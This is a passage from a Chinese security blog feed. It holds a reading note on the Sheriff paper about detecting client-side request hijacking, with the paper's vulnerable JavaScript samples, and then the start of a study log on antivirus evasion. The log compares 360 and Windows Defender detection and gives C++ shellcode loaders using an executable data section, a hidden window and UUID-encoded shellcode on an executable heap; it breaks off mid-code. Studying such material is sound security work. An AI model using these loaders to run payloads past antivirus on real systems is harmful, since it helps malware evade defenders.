title="数据建模"></a>数据建模</h4><p>​鉴于爬虫收集的网页数据，出于效率和可扩展性的原因，<code>Sheriff</code>会执行数据预处理。例如，<code>Sheriff</code>通过比较<code>SHA-256</code>脚本哈希值对客户端代码进行预处理，以过滤掉几乎重复的网页，这使其能够专注于具有不同<code>JavaScript</code>代码的页面，从而减少程序分析的总体工作量。同样，<code>Sheriff</code>可以执行其他类型的数据预处理，例如先前工作中使用的基于（自定义）搜索的数据过滤或代码规范化。</p><p>​删除重复的网页后，<code>Sheriff</code>创建被测客户端程序的属性图，捕获静态和动态程序行为，称为混合属性图<code>HPG</code>。 <code>Sheriff</code>使用<code>JAW</code>的扩展引擎实例化一个工作池来生成<code>HPG</code>。然后，这些<code>HPG</code>通过<code>Foxhound+</code>提供的污点流信息进行丰富，以修补由于静态分析缺陷而缺失的<code>HPG</code>边缘，最后存储在<code>Neo4j</code>图数据库中，我们可以查询该数据库进行安全测试。</p><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_13-58-46.png"></p><h5 id="HPG介绍"><a href="#HPG介绍" class="headerlink" title="HPG介绍"></a>HPG介绍</h5><p><code>USENIX Security Symposium</code>2021的一篇文章中提出了<code>JAW</code>框架，里面提出并详细介绍了<code>HPG</code>。</p><p><code>HPG</code>这是一种基于图的规范<code>JavaScript</code>程序模型，用于<code>JS</code>代码的分析</p><p><a href="https://www.usenix.org/system/files/sec21-khodayari.pdf">JAW: Studying Client-side CSRF with Hybrid Property Graphs and Declarative Traversals</a></p><p><code>JAW</code>，这是一个框架，可以利用混合属性图（<code>JavaScript</code>程序的规范混合模型）上的声明性遍历来针对客户端 <code>CSRF</code>分析现代<code>Web</code>应用程序。</p><p>要了解<code>HPG</code>，我觉得应该首先了解代码属性图CPG。<a href="https://zhuanlan.zhihu.com/p/395133924">参考文章</a></p><p>显然，<code>CPG</code>是一种图数据结构，它的主要思想如下：</p><ul><li><code>CPG</code>将多个程序表示(program representations)整合成一个</li><li><code>CPG</code>数据被存储在图数据库中</li><li>通过<code>DSL</code>在图数据库中遍历和查询<code>CPG</code>数据</li></ul><p>CPG 整合了 <code>AST(abstract syntax trees)</code>、<code>CFG(control flow graphs)</code>、<code>PDG(program dependence graphs)</code> 到一种数据结构当中。一个很知名的基于CPG原理的国产Java漏洞分析工具<a href="https://github.com/wh1t3p1g/tabby">Tabby</a></p><p>抽象语法树(AST)：以树的形式表现编程语言，树上的每个节点都表示源代码中的一种结构。AST一般作为源代码语法分析的重要思想，在编译原理这门课中应该会介绍。AST的应用其实是非常常见的，像是编辑器的错误提示、代码格式检查都用到了AST的原理。</p><p>程序依赖图(PDG)：处理方法是以程序的控制流图为基础，去掉CFG的控制流边，加入数据和控制流边。包括了数据依赖图和程序依赖图。数据依赖图定义了数据之间的约束关系，控制依赖图定义了语句执行情况的约束关系。程序依赖图是一个有向图。</p><p>根据下面的程序画出的图：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> x = <span class="hljs-built_in">source</span>();<br>    <span class="hljs-keyword">if</span> (x &lt; MAX)<br>    &#123;<br>        <span class="hljs-type">int</span> y = <span class="hljs-number">2</span>*x;<br>        <span class="hljs-built_in">sink</span>(y);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-19_21-22-48.png"></p><p>三者合一成为<code>CPG</code>:</p><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-19_21-23-45.png"></p><p>下面我们可以详细讨论文章中提出的<code>HPG</code>：这是论文中存在CSRF攻击的样例代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JS"><span class="hljs-keyword">var</span> i = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;输入&#x27;</span>);<br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">h</span>(<span class="hljs-params">e</span>)&#123; <br>    <span class="hljs-keyword">var</span> uri = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">hash</span>.<span class="hljs-title function_">substr</span>(<span class="hljs-number">1</span>) ;<br>    <span class="hljs-keyword">if</span> ( uri.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123; <br>        <span class="hljs-keyword">let</span> req = <span class="hljs-keyword">new</span> asyncRequest (<span class="hljs-string">&quot; POST &quot;</span> , uri ); <br>        <span class="hljs-comment">// 添加同步器令牌 </span><br>        req.<span class="hljs-title function_">initHeader</span>(<span class="hljs-string">&#x27;X-CSRF-TOKEN&#x27;</span>, token); <br>        <span class="hljs-keyword">var</span> 价格 = wait req.<span class="hljs-property">send</span> () ; <span class="hljs-number">9</span> i.<span class="hljs-property">value</span> = 价格;<br>    &#125;<br>&#125; <br>i.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;loadInvoice&#x27;</span>, h); <br>... <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">showInvoicePrice</span> ( input_id ) &#123; <br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(input_id).<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">&#x27;loadInvoice&#x27;</span>, &#123;&#125;));<br>&#125;<br><span class="hljs-title function_">showInvoicePrice</span>(<span class="hljs-string">&#x27;input&#x27;</span>);<br></code></pre></td></tr></table></figure><p>原文中的<code>HPG</code>图：说实话，根本没有看懂哈哈哈哈。先放在这里吧。</p><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-19_22-40-34.png"></p><p>​那么基于<code>CPG</code>的思想，<code>HPG</code>就是在<code>JavaScript</code>代码上的一个特化。简单来说，<code>HPG</code>是一种基于图的规范<code>JavaScript</code>程序模型，用于<code>JS</code>代码的分析。反正最后我们知道，<code>HPG</code>是客户端 <code>JavaScript</code>程序的统一表示，<strong>它将静态代码表示和运行时状态值集成到基于图形的结构中</strong>。</p><p>​状态值是在执行过程中观察到的具体程序值，例如<code>Web</code>存储值和<code>cookie</code>。<code>HPG</code>集成了多种静态代码表示，即抽象语法树 (AST)、控制流图 (CFG)、调用图 (CG)、程序依赖图 (PDG) 以及事件注册、调度和依赖图 (ERDDG)，它们分别捕捉程序的语法嵌套、执行顺序、函数调用关系、数据流和控制依赖性以及事件驱动的控制传输。<code>HPG</code>还包含语义类型，它们是分配给节点（例如接收器和源）的标签，用于捕获指令的语义含义。<code>HPG</code>编码为有向图，采用标记属性图结构，其中节点和边拥有标签和键值属性。</p><p>​总之就是基于<code>HPG</code>，我们可以便捷地分析<code>JavaScript</code>的代码片段。</p><h5 id="改进：Taintflow-Augmented-TA-HPGs"><a href="#改进：Taintflow-Augmented-TA-HPGs" class="headerlink" title="改进：Taintflow-Augmented (TA) HPGs"></a>改进：Taintflow-Augmented (TA) HPGs</h5><p>​研究者们制定了<code>HPG</code>上的请求劫持漏洞检测任务，打算识别在页面加载时触发的请求发送指令，因为这些指令容易被攻击者通过程序输入操纵。</p><p>​不幸的是，由于客户端<code>JavaScript</code>程序的动态特性，执行此类过程间可达性和数据流分析任务并非易事。虽然<code>HPG</code>状态值（即环境属性和事件跟踪）通过对具体对象快照（例如，指向分析和触发的分析）进行推理，有助于减轻许多<code> JavaScript</code>静态分析缺点（例如，不精确的控制和数据流依赖性事件处理程序），但也不足以识别图中许多其他丢失的调用和数据流连接。</p><p>​在本文中，<strong>研究者使用成熟的浏览器内动态污点跟踪，通过向节点添加补充边和标签（例如，标记可达性、语义类型和运行时变量值）来进一步增强HPG，从而重建缺失连接使得其在页面加载时可以访问，否则静态分析会错过这些</strong>。</p><p>​我们使用<code>Foxhound+</code>收集从输入源到所有接收器类型的动态污点流，包括那些不是请求发送指令的指令，以便补充<code>HPG</code>中尽可能多的可能缺失元素。</p><p>​具体来说，首先从<code>Foxhound+</code>中提取动态调用图和数据流图，并将它们分别与静态调用图和<code>PDG</code>合并。为了进行动态和静态图之间的匹配以进行合并，我们首先通过比较两个模型中的脚本哈希来确定指令或节点位于哪个脚本文件中，然后使用代码行来确定顶层（即<code>CFG</code>）该指令的<code>HPG</code>中的节点。</p><p>​将动态数据流图与<code>PDG</code>合并时，如果缺少边，我们将创建数据依赖边，标签是传播其数据的污点流中报告的变量名称。相反，如果两个节点之间已经存在<code>PDG</code>边，我们会向该边添加一个标签，标记传播变量的运行时值。</p><p>​类似地，当合并两个调用图时，如果缺少一条新边，我们将创建一条新边，并用调用的函数和参数名称以及函数调用的具体参数值对其进行标记。然而，当<code>HPG</code>中存在调用边缘时，我们只能通过添加调用站点参数的运行时值来丰富其信息。</p><p>​最后，我们为所有源节点和接收节点添加标签作为语义类型，捕获这些指令的语义，例如，为读取<code>document.URI</code>值的指令设置类型<code>RD_DOC_URL</code>，然后在计算后传播到其他<code>HPG</code>节点的程序。</p><p>​为了增强<code>JAW</code>的<code>HPG</code>生成，我们做了一些修改，解决了<code>ES6</code>支持不完整的问题，以改进控制传输建模和数据流分析。例如，我们使用<code>Promise</code>对象和<code>setTimeout()</code>回调添加了对异步操作的支持，提高了调用图和<code>PDG</code>边的精度。</p><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_16-07-21.png"></p><p>​此外，我们应用了多种优化来提高可扩展性，例如处理<code>PDG</code>构建期间迭代构造的低效率问题，以及通过使用<code>ineo</code>创建协调器来并行管理<code>Neo4j</code>图形数据库。总体而言，这些修改解决了 <code>JAW</code>的几个缺点，使<code>HPG</code>的构建能够进行更精确的分析并提高了可扩展性。</p><p>​下方右侧的图显示了 Sheriff 为下方左侧中的代码生成的 TA-HPG，它增加了由于动态函数调用而丢失的 HPG 边缘。特别关注的是，Sheriff 使用 Foxhound+ 提供的动态污点流添加第 26 行中的调用表达式节点和第 17 行中的函数声明节点之间的调用边，以及 (ii) 从第 13 行中的赋值表达式到第 26 行中的调用表达式节点用于调用参数 u 和 d。</p><pre><code class="hljs"> 因此，TA-HPG 遍历现在可以从 L12 中的源节点开始，经过 L13、L26 和 L17 节点，最后到达接收器指令，该接收器指令拾取攻击者控制的值。</code></pre><p>实例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> c = &#123;&#125;, i = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// handle incoming postMessages</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;message&quot;</span>, h); <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">h</span>(<span class="hljs-params">e</span>)&#123; <br>    <span class="hljs-keyword">if</span>(e.<span class="hljs-property">origin</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;bbc.com&quot;</span>) &gt; -<span class="hljs-number">1</span>)&#123; <br>        i = i + <span class="hljs-number">1</span>; <br>    <span class="hljs-comment">// [...] </span><br>        <span class="hljs-keyword">var</span> d = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123;<br>            <span class="hljs-string">&quot;csrf_token&quot;</span>: <span class="hljs-string">&quot;xyz-token&quot;</span>,<br>            <span class="hljs-string">&quot;state&quot;</span>: &#123;...&#125;, <span class="hljs-number">11</span> &#125;);<br>            <span class="hljs-keyword">var</span> u = e.<span class="hljs-property">data</span> + <span class="hljs-string">&#x27;/userinfo&#x27;</span>;<br>            c[<span class="hljs-string">&quot;r&quot;</span> + i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>(<span class="hljs-string">&quot;httpPostRequest(&quot;</span>+ u + <span class="hljs-string">&quot;,&quot;</span> + d + <span class="hljs-string">&quot;)&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">httpPostRequest</span>(<span class="hljs-params">url, body</span>)&#123; <br>    <span class="hljs-comment">// [...]</span><br>    navigator.<span class="hljs-title function_">sendBeacon</span>(url, body) <br>&#125;<br><span class="hljs-comment">// remember state upon closing the session </span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;visibilitychange&quot;</span>, saveState);<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">saveState</span>(<span class="hljs-params">e</span>) &#123; <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">visibilityState</span> === <span class="hljs-string">&quot;hidden&quot;</span>) &#123; <br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> j=<span class="hljs-number">1</span>; j&lt;= i; j++)&#123;<br>            c[<span class="hljs-string">&quot;r&quot;</span> + j](); <br>        &#125; <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_15-06-35.png"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​将客户端代码建模为<code>TA-HPG</code>后，<strong>研究者将检测请求劫持漏洞的任务定义为图遍历问题</strong>。具体来说，假设攻击者已经控制了某些指令的参数输入，现在搜索出页面加载时发送敏感请求的程序指令。</p><p>​第一步，识别读取攻击者控制的输入的<code>TA-HPG</code>源，并为它们分配一个与<code>JAW</code>类似的相关语义类型，例如，我们为读取的指令设置一个名为 <code>RD_WIN_LOC</code>的标签通过<code>window.location API</code>获取<code>URL</code>。然后，给定用于发送请求的浏览器<code>API</code>列表，Sheriff 搜索<code>TA-HPG</code>以识别使用这些<code>API</code>的节点，并通过为它们分配相关的语义类型将它们标记为接收器，例如，标签 <code>WR_ASYNC_REQ_URL</code>是为写入异步请求的<code>URL</code>的指令设置的，例如<code>XMLHttpRequest.open()</code>。</p><p>​最后，为了发现易受攻击的路径，<code>Sheriff</code>通过在<code>PDG</code>、<code>CFG</code>、<code>CG</code>和<code>ERDDG</code>边上将语义类型从源传播到接收器来执行数据流分析，其中具有接收器语义类型的节点被源类型污染，并且获取攻击者控制的值。</p><p>​然后执行可达性分析，以检查易受攻击的路径是否可能对应于页面加载时执行的代码行。为此，它从污染源节点和sink node(污染数据的关键中转调用点)开始，向后跟踪 <code>CFG</code>、<code>ERDDG</code>和<code>CG</code>边，直到到达<code>CFG</code>入口节点或不再存在与回溯条件匹配的边，并选择污染源节点和sink node都存在的数据流。那么此接收器是可到达的节点。最终，该组件输出一组具有从源到请求接收器的潜在数据流的路径。</p><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-20_01-01-49.png"></p><h3 id="漏洞验证方法"><a href="#漏洞验证方法" class="headerlink" title="漏洞验证方法"></a>漏洞验证方法</h3><p>​研究者通过<code>Playwright</code>和<code>Chrome DevTools Protocol</code>来执行运行时监控，检测了负责发送请求的浏览器 <code>API</code>并拦截页面加载时发生的网络消息。为了最大限度地规避造成实际危害，验证模块检测请求<code>API</code>仅记录请求参数，而不实际向服务器端发送任何请求。对于每个实时页面，会首先比较其与数据集里的哈希值。如果相同的话，选择实时运行的页面进行监控。这样做是为了保证使用的是收集时的页面。</p><p>​然后，对于每个请求劫持数据流，我们向相应的源输入一个无害的<code>token</code>，在由<code>Playwright</code>控制的检测浏览器中加载网页，并在客户端请求中搜索这个<code>token</code>以检查是否观察到了被操纵的输入。由于<code>DOM</code>环境不同，即使相同的页面，可能会有不同的执行结果，所有接近重复的页面也会测试每个候选数据流。</p><h3 id="实证评估"><a href="#实证评估" class="headerlink" title="实证评估"></a>实证评估</h3><p>​表 3 总结了数据收集和建模步骤的结果。从 10K 种子 URL 开始，<code>Sheriff</code>在所有网站上总共获得了约1M个网页。每个网站的平均为103个页面。这些 100 万个页面包含大约 4610 万个脚本。页面重复数据删除将数据集的大小减少了约17%。也就是说，在总共 100 万个网页中，有 867,455个页面是唯一的</p><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-20_22-25-11.png"></p><p>​考虑到原始数据的庞大规模以及分析数十万个网页的需要，研究者通过将测试工作集中在每个网站中动态污点流频率最高的前 50 个页面上，进一步缩小了测试床的大小（源自输入源并到达请求发送接收器），这是基于这些页面包含漏洞的概率较高。总之，867K 个唯一页面包含约 720 万个动态污点流，这些流向请求发送接收器，我们将其用于页面选择。因此，867K 网页被过滤为 339,267 个页面。其中，Sheriff 提取了 11,544,754 个脚本和 21.6M动态污点流，用它们来丰富 HPG，以修复静态分析未发现的缺失连接。在这 2160 万个污点流中，有 3,318,747 个流包含请求发送接收器，这可以表明存在请求劫持漏洞。 Sheriff 总共平均处理 34 个脚本和每页 95K LoC，生成 339,267 个 TA-HPG。</p><p>​<strong>在可被劫持的各种类型的请求中，异步请求最为普遍 (85%)，在 905 个站点中有超过 172K 个实例。有趣的是，窗口导航请求(Window Navigation Requests)是第二常见的（8.2%），占 365 个站点。在另一个极端，被劫持的推送请求和 EventSource 发生的频率最低，分别仅影响 25 个和 3 个站点的约 0.3% 的请求流。最后，被劫持的 WebSocket劫持和顶级请求(Top-level Request)表现出中等程度的流行程度，相当于总共约 6% 的易受攻击的数据流。</strong></p><p>​新漏洞类型和变体构成了请求劫持的很大一部分（即 36.1%）。首先，新漏洞类型占已发现案例总数 23.6 万个的 14.2%（35,159 个）以上。其中，Sheriff 验证了 10,925 个网页和 439 个站点的 28,827 个易受攻击的数据流，突显了新漏洞的广泛存在。然后，21.9% 的请求劫持是我们考虑使用新浏览器 API 的新变体。</p><p>​发现的劫持造成的危害中最常见的是客户端 CSRF，其中 96% 的漏洞（即 196K）可以被滥用。然而，48.5% 的可劫持请求也可能被滥用进行信息泄露，因为攻击者可以控制请求发送到的端点，从而窃取请求正文中包含的敏感信息，例如 CSRF 令牌、PII、推送端点和加密密钥。最不常见的后果是推送订阅上的持续 DoS，占漏洞总数的 0.2%。其他常见后果是客户端 XSS 和开放重定向，总共影响 10.1% 的页面。最后，4.2%的漏洞可能导致WebSocket和EventSource的跨站点连接劫持。</p><p>​通过修补漏洞检测所需的缺失 HPG 边缘（即混合数据流路径），帮助静态分析识别 17.9K 额外数据流。然而，表 3 强调了纯动态分析的一个关键挑战：报告的污点流规模很大，其中大部分不受攻击者控制（参见表 10）。相反，静态分析能够检测到 66.2K 数据流。因此，动态和静态分析的结合可能是有利的。动态分析通过补充 HPG 边缘（例如调用图）来增强静态分析，而静态分析有助于消除攻击者无法控制的虚假污点流（例如由于输入验证）。</p><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-20_22-48-43.png"></p><p>​表 6 总结了在调查过程中发现的攻击。我们总共在 49 个网站上创建了 67 个概念验证漏洞，产生了深远的影响，例如 CSRF、客户端 XSS、开放重定向以及跨各种流行平台和功能的敏感信息泄漏。值得注意的是，我们发现了 Starz 电影流服务中的帐户接管漏洞、Microsoft Azure 中的用户 VM 删除、Google DoubleClick 和 VK 中的任意重定向、DW 和 BBC 中的帐户设置操纵、Indeed 中的工作申请篡改、通过 WebSocket 的数据泄露JustWatch 和 Forbes 中的 EventSource 劫持、Reddit 中 PushManager 订阅的 CSRF、Yoox 购物网站中推送通知的持久客户端 DoS，以及 TP-Link 中的客户端 XSS，仅举几个例子。其中，24 个站点的总共 33 个漏洞属于我们工作中提出的新漏洞类型。我们建议感兴趣的读者参阅§A.2，了解已确认攻击的案例研究。</p><h3 id="防御策略评估"><a href="#防御策略评估" class="headerlink" title="防御策略评估"></a>防御策略评估</h3><p>​本节讨论 RQ3，我们在其中审查和评估针对客户端请求劫持漏洞的现有对策的采用情况和有效性。我们系统地调查了学术文献、W3C 规范和 OWASP CheatSheet Series，寻找经典的反 CSRF 对策和那些可以减轻客户端请求劫持的防御措施。总的来说，研究者确定了 10 种不同的请求伪造防御措施，并根据执行方（即 Web 应用程序或浏览器）将其分为两大类。</p><p><img src="/2024/04/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB1/Snipaste_2024-04-21_20-45-26.png"></p><p>​我们的分析发现，约 47% 的易受攻击的数据流没有任何输入验证检查，这表明开发人员很大程度上没有意识到与控制客户端请求相关的风险。</p><p>​<code>window.open()</code>在新窗口中打开易受攻击的目标页面，<code>COOP</code>可用于将浏览上下文与同源文档隔离。例如，如果在新窗口中打开一个诚实的、带有<code>COOP</code>的跨域页面，则恶意打开的页面将不会引用它，从而阻止攻击者设置窗口名称，或向新窗口发送<code>postMessages</code>，这在<code>turn</code>可以防止伪造这些输入生成的请求。我们发现大约 7% 的请求劫持数据流可以通过<code>COOP</code>缓解，因为它们依赖于窗口名称、文档引用者和<code>postMessages</code>来提供程序输入。然而，我们观察到，只有 ∼1.9% 的网页实施了<code>COOP</code>，而且令人惊讶的是，没有一个表现出请求劫持数据流的网页采用了这一政策，这呼吁人们提高对<code>COOP</code>的认识。</p><p>累了😥</p>]]></content>
    
    
    <categories>
      
      <category>论文阅读</category>
      
    </categories>
    
    
    <tags>
      
      <tag>论文阅读</tag>
      
      <tag>S&amp;P</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>免杀学习记录</title>
    <link href="/2024/04/15/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/04/15/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>学习免杀过程中的一些记录</p><span id="more"></span><h3 id="360会查杀hello-world程序？？"><a href="#360会查杀hello-world程序？？" class="headerlink" title="360会查杀hello world程序？？"></a>360会查杀hello world程序？？</h3><p>​当你的样本做好了, <code>shellcode</code>处理了, 加载器的代码也做了优化, 但是被杀软一扫描还是静态报毒, 很有可能是因为exe相关的操作需要进行处理。</p><p>​第一个就是 编译器&#x2F;编译参数 因为有些杀软宁可错杀1000也不放过一个, 所以针对一些特定的编译器&#x2F;编译参数, 即使你是输出 hello world, 也是会报毒的, 或者你当前程序没有数字签名就报毒，以及没有详细的版本信息就报毒，那么我们可以通过控制变量法对比查杀效果, 进而总结出来杀软的查杀态度。</p><p>360会默认查杀使用MT选项的exe</p><p>1.MT选项：链接<code>lib</code>版的C++运行库集成到程序中，不需要<code>dll</code>，因此程序会变大 </p><p>2.MD选项：使用<code>DLL</code>版的C++运行库，这样程序体积较小，但 缺点电脑上没有对应<code>DLL</code>时无法运行</p><h3 id="不同杀软的查杀细节"><a href="#不同杀软的查杀细节" class="headerlink" title="不同杀软的查杀细节"></a>不同杀软的查杀细节</h3><h4 id="WindowsDefender-360"><a href="#WindowsDefender-360" class="headerlink" title="WindowsDefender&amp;&amp;360"></a>WindowsDefender&amp;&amp;360</h4><p>就下面这段代码，使用新增数据段执行shellcode：360杀毒没有发现问题，WindowsDefender可以查杀，删除shellcode可以发现WDF不再查杀，说明360对shellcode的查杀力度不强</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker,<span class="hljs-string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="hljs-comment">// 不显示黑窗口</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg(<span class="hljs-string">&quot;vdata&quot;</span>)</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> sc[] = <span class="hljs-string">&quot;shellcode&quot;</span>;<span class="hljs-comment">//\xe8\xdf\x04\x00 ....</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> data_seg()</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker,<span class="hljs-string">&quot;/SECTION:vdata,RWE&quot;</span>)</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    ((<span class="hljs-built_in">void</span>(*)()) &amp; sc)();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/04/15/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/Snipaste_2024-04-15_13-21-31.png"> </p><p>既然对shellcode查杀厉害，那么使用uuid编码shellcode，就会发现WDF不查杀了，可以上线；但是360查杀了，因为使用的是开辟堆执行shellcode，可以得出360对shellcode的查杀稍弱，但对shellcode加载器的查杀非常强。</p><p>后续学习了一下，WDF对内存查杀非常厉害</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Rpc.h&gt;</span>3</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker,<span class="hljs-string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="hljs-comment">// 不显示黑窗</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;Rpcrt4.lib&quot;</span>)</span><br><span class="hljs-comment">//用于存放shellcode转的uuid的数组</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>* uuids[] = &#123;<span class="hljs-string">&quot;0004dfe8-f800-6e80-0f91-b1b3334600a9&quot;</span>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-comment">// 创建一个具有执行权限的堆</span><br>HANDLE hc = <span class="hljs-built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 在堆上分配一块可执行内存</span><br><span class="hljs-type">void</span>* buffer = <span class="hljs-built_in">HeapAlloc</span>(hc, <span class="hljs-number">0</span>, <span class="hljs-number">0x100000</span>);<br><span class="hljs-comment">// 检查内存分配是否成功，如果失败则输出错误信息并返回0</span><br><span class="hljs-keyword">if</span> (buffer == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">// uuid的处理</span><br>PBYTE buffer_backup = (PBYTE)buffer; <span class="hljs-comment">//定义一个存储uuid转换成的二进制字节序列(shellcode)</span><br><span class="hljs-type">int</span> elems = <span class="hljs-built_in">sizeof</span>(uuids) / <span class="hljs-built_in">sizeof</span>(uuids[<span class="hljs-number">0</span>]); <span class="hljs-comment">//获取uuid数组元素的个数</span><br><br><span class="hljs-comment">// 